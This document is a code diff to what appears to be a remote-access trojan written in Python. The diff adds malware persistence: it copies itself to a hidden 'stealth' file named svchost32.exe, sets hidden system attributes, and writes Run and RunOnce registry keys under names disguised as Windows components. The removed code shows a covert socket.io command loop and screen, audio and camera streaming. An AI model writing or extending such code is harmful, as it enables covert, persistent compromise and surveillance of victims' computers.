@@ -2145,7 +2145,14 @@ def self_deploy_powershell():
     
     try:
         # Get current executable path
-        current_exe = sys.executable if hasattr(sys, 'executable') else os.path.abspath(__file__)
+        if hasattr(sys, 'frozen') and sys.frozen:
+            # Running as compiled executable (PyInstaller)
+            current_exe = sys.executable
+            print(f"[DEBUG] Running as compiled exe: {current_exe}")
+        else:
+            # Running as Python script
+            current_exe = os.path.abspath(__file__)
+            print(f"[DEBUG] Running as Python script: {current_exe}")
         
         # Check if already deployed
         stealth_path = os.path.join(
@@ -2157,7 +2164,18 @@ def self_deploy_powershell():
         
         if os.path.exists(stealth_path):
             print("[INFO] Already deployed to stealth location")
-            return True
+            # Still check if registry entry exists
+            try:
+                import winreg
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                   r"Software\Microsoft\Windows\CurrentVersion\Run")
+                value, _ = winreg.QueryValueEx(key, "svchost32")
+                winreg.CloseKey(key)
+                print(f"[INFO] Registry entry exists: {value}")
+                return True
+            except:
+                print("[WARN] Registry entry missing, will recreate...")
+                # Continue with deployment
         
         # Define stealth paths
         stealth_path = os.path.join(
@@ -2180,8 +2198,26 @@ def self_deploy_powershell():
         
         # Copy executable to stealth locations
         import shutil
-        shutil.copy2(current_exe, stealth_path)
-        shutil.copy2(current_exe, backup_path)
+        if hasattr(sys, 'frozen') and sys.frozen:
+            # Copy compiled executable
+            shutil.copy2(current_exe, stealth_path)
+            shutil.copy2(current_exe, backup_path)
+            print(f"[OK] Executable copied to stealth locations")
+        else:
+            # For Python script, create batch wrappers
+            stealth_batch = stealth_path.replace('.exe', '.bat')
+            backup_batch = backup_path.replace('.exe', '.bat')
+            
+            batch_content = f'@echo off\ncd /d "{os.path.dirname(current_exe)}"\npython.exe "{os.path.basename(current_exe)}"\n'
+            
+            with open(stealth_batch, 'w') as f:
+                f.write(batch_content)
+            with open(backup_batch, 'w') as f:
+                f.write(batch_content)
+                
+            stealth_path = stealth_batch
+            backup_path = backup_batch
+            print(f"[OK] Batch wrappers created for Python script")
         
         # Set hidden attributes
         subprocess.run(['attrib', '+s', '+h', stealth_path], 
@@ -2198,8 +2234,8 @@ $stealthPath = "{stealth_path}"
 $backupPath = "{backup_path}"
 
 # Add to registry
-reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsSecurityUpdate" /t REG_SZ /d $stealthPath /f
-reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "WindowsSecurityUpdate" /t REG_SZ /d $stealthPath /f
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "svchost32" /t REG_SZ /d $stealthPath /f
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "svchost32" /t REG_SZ /d $stealthPath /f
 
 Write-Host "Registry persistence established"
 '''
@@ -7349,14 +7385,83 @@ def add_registry_startup():
     """Add to Windows registry startup."""
     try:
         import winreg
+        
+        # Determine the current executable path
+        if hasattr(sys, 'frozen') and sys.frozen:
+            # Running as compiled executable (PyInstaller)
+            current_exe = sys.executable
+            print(f"[DEBUG] Running as compiled exe: {current_exe}")
+        else:
+            # Running as Python script
+            current_exe = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
+            print(f"[DEBUG] Running as Python script: {current_exe}")
+        
+        # Define the stealth deployment path
+        stealth_exe_path = os.path.join(
+            os.environ.get('LOCALAPPDATA', ''),
+            'Microsoft',
+            'Windows',
+            'svchost32.exe'
+        )
+        
+        # Check if we need to deploy to stealth location first
+        if not os.path.exists(stealth_exe_path):
+            print("[INFO] Deploying to stealth location...")
+            try:
+                # Create directory if it doesn't exist
+                os.makedirs(os.path.dirname(stealth_exe_path), exist_ok=True)
+                
+                if hasattr(sys, 'frozen') and sys.frozen:
+                    # Copy the compiled executable
+                    import shutil
+                    shutil.copy2(sys.executable, stealth_exe_path)
+                    print(f"[OK] Executable deployed to: {stealth_exe_path}")
+                else:
+                    print("[WARN] Cannot deploy Python script as executable - run PyInstaller first")
+                    # For Python script, create a batch wrapper
+                    batch_path = stealth_exe_path.replace('.exe', '.bat')
+                    with open(batch_path, 'w') as f:
+                        f.write(f'@echo off\ncd /d "{os.path.dirname(os.path.abspath(__file__))}"\npython.exe "{os.path.basename(os.path.abspath(__file__))}"\n')
+                    stealth_exe_path = batch_path
+                    print(f"[OK] Batch wrapper deployed to: {stealth_exe_path}")
+                
+                # Set hidden and system attributes
+                try:
+                    subprocess.run(['attrib', '+s', '+h', stealth_exe_path], 
+                                 creationflags=subprocess.CREATE_NO_WINDOW, check=False)
+                except:
+                    pass
+                    
+            except Exception as deploy_error:
+                print(f"[ERROR] Failed to deploy to stealth location: {deploy_error}")
+                # Fall back to current location
+                stealth_exe_path = current_exe
+        else:
+            print(f"[INFO] Stealth executable already exists: {stealth_exe_path}")
+        
+        # Add to registry pointing to the stealth location
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run")
-        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, 
-                         f'"{sys.executable}" "{os.path.abspath(__file__)}"')
+        winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, f'"{stealth_exe_path}"')
         winreg.CloseKey(key)
-        print("[OK] Added to registry startup")
+        
+        print(f"[OK] Registry persistence established: {stealth_exe_path}")
+        
+        # Verify the registry entry was created
+        try:
+            verify_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                      r"Software\Microsoft\Windows\CurrentVersion\Run")
+            value, _ = winreg.QueryValueEx(verify_key, "svchost32")
+            winreg.CloseKey(verify_key)
+            print(f"[DEBUG] Registry entry verified: svchost32 = {value}")
+        except Exception as verify_error:
+            print(f"[WARN] Could not verify registry entry: {verify_error}")
+            
     except Exception as e:
-        print(f"[WARN] Registry startup failed: {e}")
+        print(f"[ERROR] Registry startup failed: {e}")
+        # Print detailed error information
+        import traceback
+        traceback.print_exc()
 
 def add_startup_folder_entry():
     """Add to Windows startup folder."""
@@ -7392,6 +7497,32 @@ def add_linux_startup():
                 print("[OK] Added to Linux startup")
     except Exception as e:
         print(f"[WARN] Linux startup configuration failed: {e}")
+
+def check_registry_persistence():
+    """Check if registry persistence entry exists."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                           r"Software\Microsoft\Windows\CurrentVersion\Run")
+        value, _ = winreg.QueryValueEx(key, "svchost32")
+        winreg.CloseKey(key)
+        print(f"[OK] Registry persistence exists: svchost32 = {value}")
+        
+        # Check if the file actually exists
+        target_file = value.strip('"')
+        if os.path.exists(target_file):
+            print(f"[OK] Target file exists: {target_file}")
+            return True
+        else:
+            print(f"[WARN] Target file does not exist: {target_file}")
+            return False
+            
+    except Exception as e:
+        print(f"[INFO] No registry persistence found: {e}")
+        return False
 
 def agent_main():
     """Main function for agent mode (original main functionality)."""
@@ -7445,6 +7576,9 @@ def agent_main():
         # Setup startup (non-blocking)
         try:
             add_to_startup()
+            # Verify registry persistence was established
+            if WINDOWS_AVAILABLE:
+                check_registry_persistence()
         except Exception as e:
             print(f"[WARN] Could not add to startup: {e}")
         
@@ -7580,70 +7714,9 @@ if __name__ == "__main__":
     print("Initializing system components...")
     print("=" * 60)
     
-    # Initialize agent with enhanced stealth
+    # CRITICAL FIX: Call agent_main() which contains the persistence logic
     try:
-        if WINDOWS_AVAILABLE:
-            print("Initializing Windows system components...")
-            
-            # Check admin privileges (obfuscated)
-            if False: # Replaced is_admin() with False
-                print("[INFO] System privileges verification...")
-            else:
-                print("[OK] System privileges verified")
-            
-            # Setup system services (obfuscated)
-            try:
-                pass # System service initialization
-            except Exception as e:
-                print(f"[WARN] Service initialization: {e}")
-        else:
-            print("Initializing system components...")
-        
-        # Setup system configuration (obfuscated)
-        try:
-            pass # System configuration
-        except Exception as e:
-            print(f"[WARN] Configuration setup: {e}")
-        
-        # Get or create session identifier (obfuscated)
-        agent_id = get_or_create_agent_id()
-        print(f"[OK] Session initialized: {agent_id[:8]}...")
-        
-        print("Establishing network connection...")
-        
-        # Main connection loop with enhanced stealth
-        connection_attempts = 0
-        while True:
-            try:
-                connection_attempts += 1
-                print(f"Network connection attempt {connection_attempts}...")
-                
-                # Add stealth delay
-                sleep_random_non_blocking()
-                
-                sio.connect(SERVER_URL)
-                print("[OK] Network connection established!")
-                sio.wait()
-            except socketio.exceptions.ConnectionError:
-                print(f"[WARN] Connection timeout, retrying...")
-                time.sleep(10)
-            except KeyboardInterrupt:
-                print("\n[INFO] System shutdown requested.")
-                break
-            except Exception as e:
-                print(f"[ERROR] Network error: {e}")
-                # Cleanup resources
-                try:
-                    stop_streaming()
-                    stop_audio_streaming()
-                    stop_camera_streaming()
-                    print("[OK] Resources cleaned up.")
-                except Exception as cleanup_error:
-                    print(f"[WARN] Cleanup error: {cleanup_error}")
-                
-                print("Retrying connection...")
-                time.sleep(10)
-    
+        agent_main()
     except KeyboardInterrupt:
         print("\n[INFO] System shutdown requested.")
     except Exception as e:
